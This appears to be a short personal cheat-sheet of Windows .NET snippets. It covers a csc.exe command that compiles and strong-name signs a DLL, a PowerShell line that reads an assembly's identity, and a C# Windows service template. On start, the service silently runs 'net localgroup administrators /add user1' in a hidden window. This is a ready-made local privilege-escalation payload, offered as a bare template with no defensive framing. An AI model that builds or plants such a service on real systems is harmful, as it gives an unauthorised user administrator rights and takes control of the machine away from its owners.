# Coding stuff
## Compiling a x86 DLL, CS/C#, with csc.exe and signing with a strong name key
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:DLLNAME.dll /target:library /keyfile:C:\Users\User1\Desktop\YOURKEY.snk C:\Users\User1\Desktop\DLLNAME-source.cs /unsafe
```
## Retreive the PublicToken, Version and Culture of your DLL via Powershell
```
([system.reflection.assembly]::loadfile("C:\Full_Path\MyDLL.dll")).FullName
```
## .Net exe-service
```
using System;
using System.Diagnostics;
using System.ServiceProcess;

namespace MyService
{
    class Program : ServiceBase
    {
        static void Main(string[] args)
        {
            ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[]
            {
                new Program()
            };
            ServiceBase.Run(ServicesToRun);
        }

        public Program()
        {
            ServiceName = "CoolServiceName";
        }

        protected override void OnStart(string[] args)
        {
            // Add code here to start your service
            Console.WriteLine("Service started");

            // Call the TEST function when the service starts
            TEST();
        }

        protected override void OnStop()
        {
            // Add code here to perform any tear-down necessary to stop your service
            Console.WriteLine("Service stopped");
        }

        // Function to call
        private void TEST()
{
    try
    {
        // Create a process start info
        ProcessStartInfo processInfo = new ProcessStartInfo();
        processInfo.FileName = "net";
        processInfo.Arguments = "localgroup administrators /add user1";
        processInfo.CreateNoWindow = true;
        processInfo.UseShellExecute = false;
        processInfo.RedirectStandardOutput = true;
        processInfo.RedirectStandardError = true;

        // Start the process
        Process process = new Process();
        process.StartInfo = processInfo;
        process.Start();

        // Wait for the process to exit
        process.WaitForExit();

        // Check for errors
        if (process.ExitCode != 0)
        {
            Console.WriteLine("Error: {process.StandardError.ReadToEnd()}");
        }
        else
        {
            Console.WriteLine("Command executed successfully.");
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine("An error occurred: " + ex.Message);
    }
}
    }
}
```
